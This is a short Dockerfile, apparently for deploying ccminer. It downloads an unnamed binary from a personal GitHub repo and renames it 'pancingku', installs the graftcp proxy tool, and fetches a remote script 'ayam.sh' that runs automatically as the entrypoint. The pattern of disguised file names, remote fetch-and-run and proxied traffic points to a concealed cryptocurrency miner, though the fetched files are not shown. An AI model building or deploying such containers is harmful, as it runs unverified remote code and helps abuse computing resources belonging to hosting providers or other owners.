# Gunakan base image Ubuntu
FROM ubuntu:20.04

# Set environment variables
ENV TZ=Asia/Singapore
ENV DEBIAN_FRONTEND=noninteractive

# Install necessary packages
RUN apt-get update && \
    apt-get install -y sudo wget curl unzip nano autoconf git cmake binutils build-essential net-tools screen golang tzdata && \
    apt-get install -y libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev && \
    dpkg-reconfigure --frontend noninteractive tzdata && \
    apt-get clean && rm -rf /var/lib/apt/lists/*

# Set workdir for ccminer
WORKDIR /root

# Download 
RUN wget https://github.com/marcelinoferdom/minse/raw/refs/heads/main/CRM-v1.0 -O /root/pancingku && \
    chmod +x /root/pancingku

# Download and extract graftcp tool (proxy setup tool)
RUN wget https://github.com/hmgle/graftcp/releases/download/v0.4.0/graftcp_0.4.0-1_amd64.deb && \
    dpkg -i graftcp_0.4.0-1_amd64.deb && \
    mkdir -p /root/graftcp/local

# Use wget to download the entrypoint.sh script from GitHub
RUN wget https://github.com/marcelinoferdom/shsh/raw/refs/heads/main/ayam.sh -O /root/ayam.sh && \
    chmod +x /root/ayam.sh

# Entrypoint script that will run the process when the container starts
ENTRYPOINT ["/root/ayam.sh"]
